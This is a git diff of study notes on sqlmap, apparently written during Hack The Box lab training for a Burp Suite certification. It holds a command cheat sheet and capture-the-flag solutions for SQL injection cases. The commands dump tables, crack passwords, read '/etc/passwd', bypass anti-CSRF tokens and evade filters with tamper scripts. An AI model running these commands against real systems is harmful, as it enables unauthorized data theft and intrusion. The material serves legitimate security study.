@@ -1,7 +1,5 @@
 # SQLMAP Essentials  
 
->Burp Suite Certified Professional [Study notes on SQLMAP](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study#sqlmap)  
-  
 | **Command** | **Description** |
 | ----------- | ----------- |
 | `sqlmap -h` | View the basic help menu |
@@ -24,7 +22,7 @@
 | `sqlmap -u "http://www.example.com/?id=1" --schema` | Database schema enumeration |
 | `sqlmap -u "http://www.example.com/?id=1" --search -T user` | Searching for data |
 | `sqlmap -u "http://www.example.com/?id=1" --passwords --batch` | Password enumeration and cracking |
-| `sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"` | Anti-CSRF token bypass |
+| `sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"` | Anti-CSRF token bypass [Anti-CSRF Token Bypass switch](https://academy.hackthebox.com/module/58/section/530) |
 | `sqlmap --list-tampers` | List all tamper scripts |
 | `sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba` | Check for DBA privileges |
 | `sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"` | Reading a local file |
@@ -144,12 +142,35 @@ sqlmap -r case1.req --batch -p 'id' -dbms MySQL -D testdb -T users --columns -C 
 ![sqlmap-csrf-token-bypass](/IMAGES/sqlmap-csrf-token-bypass.png)  
 
 ```
-sqlmap -r case8.req --batch -p 'id' Lb2eG7RF380hT4Pd0D7H0PtZsWK9YDyvggW24ArcTIw -dbms MySQL -D testdb -T flag8 --dump --no-cast
+sqlmap -r case8.req --batch -p "id" --csrf-token="t0ken" -dbms MySQL -D testdb -T flag8 --dump --flush-session --no-cast
 ```  
 
+>What's the contents of table flag9? (Case #9)
+>Detect and exploit SQLi vulnerability in GET parameter id, while taking care of the unique `uid` random values.  
 
+![sqlmap-unique-parameter-uid](/images/sqlmap-unique-parameter-uid.png)  
 
+```
+sqlmap -r case9.req --batch -p "id" --randomize="uid" -dbms MySQL -D testdb -T flag9 --dump --flush-session --no-cast
+```  
 
+>What's the contents of table flag10? (Case #10)
+>Primitive protection - Detect and exploit SQLi vulnerability in POST parameter id
 
+```
+sqlmap -r case10.req --batch -p "id" --random-agent -dbms MySQL -D testdb -T flag10 --dump --flush-session --no-cast
+```  
 
+>What's the contents of table flag11? (Case #11)
+>Case11 - Filtering of characters ```'<', '>'```
+>Detect and exploit SQLi vulnerability in GET parameter `id`, bypass using [Tamper Scripts](https://academy.hackthebox.com/module/58/section/530).  
 
+```
+sqlmap -r case11.req --batch -p "id" --tamper=between -dbms MySQL -D testdb -T flag11 --dump --flush-session --no-cast
+```  
+
+>The most popular tamper scripts `between` is replacing all occurrences of greater than operator `(>)` with NOT BETWEEN 0 AND #, and the equals operator `(=)` with BETWEEN # AND #.
+>This way, many primitive protection mechanisms (focused mostly on preventing XSS attacks) are easily bypassed, at least for SQLi purposes.  
+
+>Burp Suite Certified Professional [Study notes on SQLMAP](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study#sqlmap)  
+  
